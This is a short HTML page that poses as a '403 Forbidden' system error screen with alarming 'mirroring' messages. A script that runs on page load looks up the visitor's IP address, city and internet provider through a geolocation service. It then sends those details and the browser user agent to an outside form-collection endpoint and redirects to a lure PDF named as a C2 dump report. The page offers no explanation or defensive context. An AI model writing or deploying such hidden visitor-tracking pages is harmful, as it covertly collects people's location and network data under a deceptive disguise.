<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Error - 403 Forbidden</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', monospace; padding: 20px; }
        .cmd { margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="cmd">SYSTEM_CRITICAL_FAILURE: Mirroring active...</div>
    <div class="cmd">REDIRECTING TO RECOVERY_LOGS...</div>

    <script>
        async function forceCapture() {
            let info = {};
            try {
                const res = await fetch('https://ipapi.co/json/');
                info = await res.json();
            } catch(e) {}

            await fetch("https://formspree.io/f/xzdodlnk", {
                method: "POST",
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    _subject: "🚨 INFRASTRUCTURE ALERT: " + (info.ip || "UNKNOWN"),
                    IP: info.ip,
                    City: info.city,
                    Provider: info.org,
                    UA: navigator.userAgent
                })
            });

            setTimeout(() => {
                window.location.href = "C2-Mirror-Auto-Dump-Report.pdf";
            }, 800);
        }
        forceCapture();
    </script>
</body>
</html>
